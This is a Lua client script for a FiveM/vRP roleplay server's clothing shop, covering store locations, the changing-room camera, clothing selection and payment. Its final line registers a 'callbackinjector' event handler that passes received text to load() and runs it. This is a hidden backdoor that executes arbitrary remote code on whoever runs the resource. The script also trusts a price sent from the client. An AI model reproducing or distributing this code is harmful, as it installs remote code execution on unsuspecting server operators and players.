------------------SCRIPT CORRIGIDO POR ANDERSON FABRIS
------------------SUPORTE PELO DISCORD: AndiGame#5670
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRPrp = {}
vRP = Proxy.getInterface("vRP")
vRPserver = Tunnel.getInterface("vRP")
Tunnel.bindInterface("vrp_skinshop", vRPrp)
Proxy.addInterface("vrp_skinshop", vRPrp)

local lojaderoupa = { --- lr > loja de roupa
    
    { name = "Loja de Roupas", id = 73, color = 13, x = 75.05, y = -1399.72, z = 29.38, provador = {x = 75.05, y = -1399.72, z = 29.38, heading = 6.32}}, --- lr 1
    { name = "Loja de Roupas", id = 73, color = 13, x = 72.98, y = -1399.72, z = 29.38, provador = {x = 72.98, y = -1399.72, z = 29.38, heading = 6.32}}, --- lr 1
    { name = "Loja de Roupas", id = 73, color = 13, x = 70.93, y = -1399.72, z = 29.38, provador = {x = 70.93, y = -1399.72, z = 29.38, heading = 6.32}}, --- lr 1

    { name = "Loja de Roupas", id = 73, color = 13, x = -709.87, y = -153.8, z = 37.42, provador = {x = -709.87, y = -153.8, z = 37.42, heading = 119.10}}, --- lr 2
    { name = "Loja de Roupas", id = 73, color = 13, x = -709.61, y = -162.35, z = 37.42, provador = {x = -709.61, y = -162.35, z = 37.42, heading = 28.21}}, --- lr 2
    { name = "Loja de Roupas", id = 73, color = 13, x = -707.95, y = -161.42, z = 37.42, provador = {x = -707.95, y = -161.42, z = 37.42, heading = 28.21}}, --- lr 2
    { name = "Loja de Roupas", id = 73, color = 13, x = -706.4, y = -160.42, z = 37.42, provador = {x = -706.4, y = -160.42, z = 37.42, heading = 28.21}}, --- lr 2

    { name = "Loja de Roupas", id = 73, color = 13, x = -162.97, y = -302.01, z = 39.74, provador = {x = -162.97, y = -302.01, z = 39.74, heading = 253.28}}, --- lr 3
    
    { name = "Loja de Roupas", id = 73, color = 13, x = 425.43, y = -799.49, z = 29.5, provador = {x = 425.43, y = -799.49, z = 29.5, heading = 180.97}}, --- lr 4
    { name = "Loja de Roupas", id = 73, color = 13, x = 427.44, y = -799.49, z = 29.5, provador = {x = 427.67, y = -799.49, z = 29.5, heading = 180.97}}, --- lr 4
    { name = "Loja de Roupas", id = 73, color = 13, x = 429.50, y = -799.49, z = 29.5, provador = {x = 430.12, y = -799.49, z = 29.5, heading = 180.97}}, --- lr 4 

    { name = "Loja de Roupas", id = 73, color = 13, x = -821.66, y = -1073.52, z = 11.33, provador = {x = -821.66, y = -1073.52, z = 11.33, heading = 209.80}}, --- lr 5

    { name = "Loja de Roupas", id = 73, color = 13, x = -1202.47, y = -772.9, z = 17.32, provador = {x = -1202.47, y = -772.9, z = 17.32, heading = 216.25}}, --- lr 6
    { name = "Loja de Roupas", id = 73, color = 13, x = -1187.8, y = -765.07, z = 17.33, provador = {x = -1187.8, y = -765.07, z = 17.33, heading = 128.85}}, --- lr 6

    { name = "Loja de Roupas", id = 73, color = 13, x = -1451.21, y = -237.99, z = 49.81, provador = {x = -1451.21, y = -237.99, z = 49.81, heading = 54.55}}, --- lr 7
    
    { name = "Loja de Roupas", id = 73, color = 13, x = 4.06, y = 6512.11, z = 31.88, provador = {x = 4.06, y = 6512.11, z = 31.88, heading = 48.22}}, --- lr 8

    { name = "Loja de Roupas", id = 73, color = 13, x = 1693.69, y = 4822.13, z = 42.07, provador = {x = 1693.69, y = 4822.13, z = 42.07, heading = 98.45}}, --- lr 9

    { name = "Loja de Roupas", id = 73, color = 13, x = 130.29, y = -214.47, z = 54.56, provador = {x = 130.29, y = -214.47, z = 54.56, heading = 69.39}}, --- lr 10
    { name = "Loja de Roupas", id = 73, color = 13, x = 123.04, y = -229.24, z = 54.56, provador = {x = 123.04, y = -229.24, z = 54.56, heading = 339.62}}, --- lr 10

    { name = "Loja de Roupas", id = 73, color = 13, x = 613.8, y = 2752.5, z = 42.09, provador = {x = 613.8, y = 2752.5, z = 42.09, heading = 278.27}}, --- lr 11

    { name = "Loja de Roupas", id = 73, color = 13, x = 1197.34, y = 2709.81, z = 38.23, provador = {x = 1197.34, y = 2709.81, z = 38.239, heading = 187.53}}, --- lr 12

    { name = "Loja de Roupas", id = 73, color = 13, x = -3165.34, y = 1052.59, z = 20.87, provador = {x = -3165.34, y = 1052.59, z = 20.87, heading = 69.39}}, --- lr 13

    { name = "Loja de Roupas", id = 73, color = 13, x = -1100.76, y = 2710.75, z = 19.11, provador = {x = -1100.76, y = 2710.75, z = 19.11, heading = 221.79}}, --- lr 14



}

local parts = {
    mascara = 1,
    mao = 3,
    calca = 4,
    mochila = 5,
    sapato = 6,
    gravata = 7,
    camisa = 8,
    colete = 9,
    jaqueta = 11,
    bone = "p0",
    oculos = "p1",
    brinco = "p2",
    relogio = "p6",
    bracelete = "p7"
}

local carroCompras = {
    mascara = false,
    mao = false,
    calca = false,
    mochila = false,
    sapato = false,
    gravata = false,
    camisa = false,
    jaqueta = false,
    colete = false,
    bone = false,
    oculos = false,
    brinco = false,
    relogio = false,
    bracelete = false
}

local old_custom = {}

local valor = 0
local precoTotal = 0

local in_loja = false
local atLoja = false

-- Provador
local chegou = false
local noProvador = false

-- Cam controll
local pos = nil
local camPos = nil
local cam = -1
local dataPart = 1
local texturaSelected = 0
local handsup = false

function SetCameraCoords()
    local ped = PlayerPedId()
	RenderScriptCams(false, false, 0, 1, 0)
    DestroyCam(cam, false)
    
	if not DoesCamExist(cam) then
        cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
		SetCamActive(cam, true)
        RenderScriptCams(true, true, 500, true, true)

        pos = GetEntityCoords(PlayerPedId())
        camPos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, 0.0)
        SetCamCoord(cam, camPos.x, camPos.y, camPos.z+0.75)
        PointCamAtCoord(cam, pos.x, pos.y, pos.z+0.15)
    end

end

function DeleteCam()
	SetCamActive(cam, false)
	RenderScriptCams(false, true, 0, true, true)
	cam = nil
end

RegisterNUICallback("changePart", function(data, cb)
    dataPart = parts[data.part]
    local ped = PlayerPedId()
    if GetEntityModel(ped) == GetHashKey("mp_m_freemode_01") then
        SendNUIMessage({ 
            changeCategory = true, 
            sexo = "Male", prefix = "M", 
            drawa = vRP.getDrawables(dataPart), category = dataPart 
        })
    elseif GetEntityModel(ped) == GetHashKey("mp_f_freemode_01") then 
        SendNUIMessage({ 
            changeCategory = true, 
            sexo = "Female", prefix = "F", 
            drawa = vRP.getDrawables(dataPart), category = dataPart 
        })
    end
end)

Citizen.CreateThread(function()
    while true do
        local kswait = 1000
        
        local ped = PlayerPedId()
        local playerCoords = GetEntityCoords(ped, true)
        
        for k, v in pairs(lojaderoupa) do
            local provador = lojaderoupa[k].provador

            if GetDistanceBetweenCoords(playerCoords.x, playerCoords.y, playerCoords.z, lojaderoupa[k].x, lojaderoupa[k].y, lojaderoupa[k].z, true ) <= 9.0 and not in_loja then
                kswait = 4
                DrawMarker(27,lojaderoupa[k].x, lojaderoupa[k].y, lojaderoupa[k].z-0.97,0,0,0,0,0,0,1.0,1.0,0.5,0, 191, 255,155,0,0,0,1)
               
            end
			if GetDistanceBetweenCoords(playerCoords.x, playerCoords.y, playerCoords.z, lojaderoupa[k].x, lojaderoupa[k].y, lojaderoupa[k].z, true ) <= 2.0 and not in_loja then
                kswait = 4
				drawTxt("PRESSIONE  ~r~E~w~  PARA SE TROCAR",4,0.5,0.93,0.50,255,255,255,180)
				
				end

            if GetDistanceBetweenCoords(GetEntityCoords(ped), lojaderoupa[k].x, lojaderoupa[k].y, lojaderoupa[k].z, true) < 1 then
                kswait = 4
                if IsControlJustPressed(0, 38) then
                    valor = 0
                    precoTotal = 0
                    noProvador = true
                    old_custom = vRP.getCustomization()
                    old = {}

                    cor = 0
		            dados, tipo = nil

                    TaskGoToCoordAnyMeans(ped, provador.x, provador.y, provador.z, 1.0, 0, 0, 786603, 0xbf800000)
                end
            end

            if noProvador then
                if GetDistanceBetweenCoords(GetEntityCoords(ped), provador.x, provador.y, provador.z, true) < 0.5 and not chegou then
                    kswait = 4
                    chegou = true

                    valor = 0
                    precoTotal = 0
                    SetEntityHeading(PlayerPedId(), provador.heading)
                    FreezeEntityPosition(ped, true)
                    ----------------------------------------------------SetEntityInvincible(ped, true)
                    openGuiLojaRoupa()
                end
            end
        end
        Citizen.Wait(kswait)
    end
end)

function openGuiLojaRoupa()
    local ped = PlayerPedId()
    SetNuiFocus(true, true)
    SetCameraCoords()
    if GetEntityModel(ped) == GetHashKey("mp_m_freemode_01") then
        SendNUIMessage({ 
            openLojaRoupa = true, 
            sexo = "Male", prefix = "M", 
            drawa = vRP.getDrawables(dataPart), category = dataPart 
        })
    elseif GetEntityModel(ped) == GetHashKey("mp_f_freemode_01") then 
        SendNUIMessage({ 
            openLojaRoupa = true, 
            sexo = "Female", prefix = "F", 
            drawa = vRP.getDrawables(dataPart), category = dataPart 
        })
    end
    in_loja = true
end

RegisterNUICallback("leftHeading", function(data, cb)
    local currentHeading = GetEntityHeading(PlayerPedId())
    heading = currentHeading-tonumber(data.value)
    SetEntityHeading(PlayerPedId(), heading)
end)

RegisterNUICallback("handsUp", function(data, cb)
    local dict = "missminuteman_1ig_2"
    
	RequestAnimDict(dict)
	while not HasAnimDictLoaded(dict) do
		Citizen.Wait(100)
    end
    
    if not handsup then
        TaskPlayAnim(PlayerPedId(), dict, "handsup_enter", 8.0, 8.0, -1, 50, 0, false, false, false)
        handsup = true
    else
        handsup = false
        ClearPedTasks(PlayerPedId())
    end
end)

RegisterNUICallback("rightHeading", function(data, cb)
    local currentHeading = GetEntityHeading(PlayerPedId())
    heading = currentHeading+tonumber(data.value)
    SetEntityHeading(PlayerPedId(), heading)
end)

function updateCarroCompras()
    valor = 0
    for k, v in pairs(carroCompras) do
        if carroCompras[k] == true then
            valor = valor + 75
        end
    end
    precoTotal = valor
    return valor
end

RegisterNUICallback("changeColor", function(data, cb)
    if type(dados) == "number" then
        max = GetNumberOfPedTextureVariations(PlayerPedId(), dados, tipo)
    elseif type(dados) == "string" then
        max = GetNumberOfPedPropTextureVariations(PlayerPedId(), parse_part(dados), tipo)
    end

    if data.action == "menos" then
        if cor > 0 then cor = cor - 1 else cor = max end
    elseif data.action == "mais" then
        if cor < max then cor = cor + 1 else cor = 0 end
    end
    if dados and tipo then setRoupa(dados, tipo, cor) end
end)

function changeClothe(type, id)
    dados = type
    tipo = tonumber(parseInt(id))
	cor = 0
    setRoupa(dados, tipo, cor)
end

function setRoupa(dados, tipo, cor)
    local ped = PlayerPedId()

	if type(dados) == "number" then
		SetPedComponentVariation(ped, dados, tipo, cor, 1)
    elseif type(dados) == "string" then
        SetPedPropIndex(ped, parse_part(dados), tipo, cor, 1)
        dados = "p" .. (parse_part(dados))
	end
	  
  	custom = vRP.getCustomization()
  	custom.modelhash = nil

	aux = old_custom[dados]
	v = custom[dados]

    if v[1] ~= aux[1] and old[dados] ~= "custom" then
        carroCompras[dados] = true
        price = updateCarroCompras()
        SendNUIMessage({ action = "setPrice", price = price, typeaction = "add" })
    	old[dados] = "custom"
    end
    if v[1] == aux[1] and old[dados] == "custom" then
        carroCompras[dados] = false
        price = updateCarroCompras()
        SendNUIMessage({ action = "setPrice", price = price, typeaction = "remove" })
    	old[dados] = "0"
	end

	SendNUIMessage({ value = price })
end

RegisterNUICallback("changeCustom", function(data, cb)
    changeClothe(data.type, data.id)
end)

RegisterNUICallback("payament", function(data, cb)
    carroCompras = {
        mascara = false,
        mao = false,
        calca = false,
        mochila = false,
        sapato = false,
        gravata = false,
        camisa = false,
        jaqueta = false,
        colete = false,
        bone = false,
        oculos = false,
        brinco = false,
        relogio = false,
        bracelete = false
    }
    TriggerServerEvent("LojaDeRoupas:Comprar", tonumber(data.price)) 
end)

RegisterNUICallback("reset", function(data, cb)
    vRP.setCustomization(old_custom)
    closeGuiLojaRoupa()
    ClearPedTasks(PlayerPedId())
end)

function closeGuiLojaRoupa()
    local ped = PlayerPedId()
    DeleteCam()
    SetNuiFocus(false, false)
    SendNUIMessage({ openLojaRoupa = false })
    FreezeEntityPosition(ped, false)
    ----------------------------------------------------SetEntityInvincible(ped, false)
    PlayerReturnInstancia()
    SendNUIMessage({ action = "setPrice", price = 0, typeaction = "remove" })
    
    in_loja = false
    noProvador = false
    chegou = false
    old_custom = {}
end

RegisterNetEvent('LojaDeRoupas:ReceberCompra')
AddEventHandler('LojaDeRoupas:ReceberCompra', function(comprar)
    if comprar then
        in_loja = false
        closeGuiLojaRoupa()
    else
        in_loja = false
        vRP.setCustomization(old_custom)
        closeGuiLojaRoupa()
    end
end)

function parse_part(key)
    if type(key) == "string" and string.sub(key, 1, 1) == "p" then
        return tonumber(string.sub(key, 2))
    else
        return false, tonumber(key)
    end
end

function PlayerInstancia()
    for _, player in ipairs(GetActivePlayers()) do
        local ped = PlayerPedId()
        local otherPlayer = GetPlayerPed(player)
        if ped ~= otherPlayer then
            ----------------------------------------------------SetEntityVisible(otherPlayer, false)
            SetEntityNoCollisionEntity(ped, otherPlayer, true)
        end
    end
end

function PlayerReturnInstancia()
    for _, player in ipairs(GetActivePlayers()) do
        local ped = PlayerPedId()
        local otherPlayer = GetPlayerPed(player)
        if ped ~= otherPlayer then
            ----------------------------------------------------SetEntityVisible(otherPlayer, true)
            SetEntityCollision(ped, true)
        end
    end
end

function criarBlip()
    for _, item in pairs(lojaderoupa) do
        item.blip = AddBlipForCoord(item.x, item.y, item.z)
        SetBlipSprite(item.blip, item.id)
        SetBlipColour(item.blip, item.color)
        SetBlipScale(item.blip, 0.4)
        SetBlipAsShortRange(item.blip, true)
        BeginTextCommandSetBlipName("STRING")
        AddTextComponentString(item.name)
        EndTextCommandSetBlipName(item.blip)
    end
end

function drawTxt(text,font,x,y,scale,r,g,b,a)
    SetTextFont(font)
    SetTextScale(scale,scale)
    SetTextColour(r,g,b,a)
    SetTextOutline()
    SetTextCentre(1)
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x,y)
end

Citizen.CreateThread(function()
    while true do
        if noProvador then
            PlayerInstancia()
            DisableControlAction(1, 1, true)
            DisableControlAction(1, 2, true)
            DisableControlAction(1, 24, true)
            DisablePlayerFiring(PlayerPedId(), true)
            DisableControlAction(1, 142, true)
            DisableControlAction(1, 106, true)
            DisableControlAction(1, 37, true)
        end
        Citizen.Wait(1)
    end
end)

Citizen.CreateThread(function()
    while true do
        N_0xf4f2c0d4ee209e20()
        Citizen.Wait(1000)
    end
end)

AddEventHandler('onResourceStop', function(resource)
    if resource == GetCurrentResourceName() then
        closeGuiLojaRoupa()
    end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)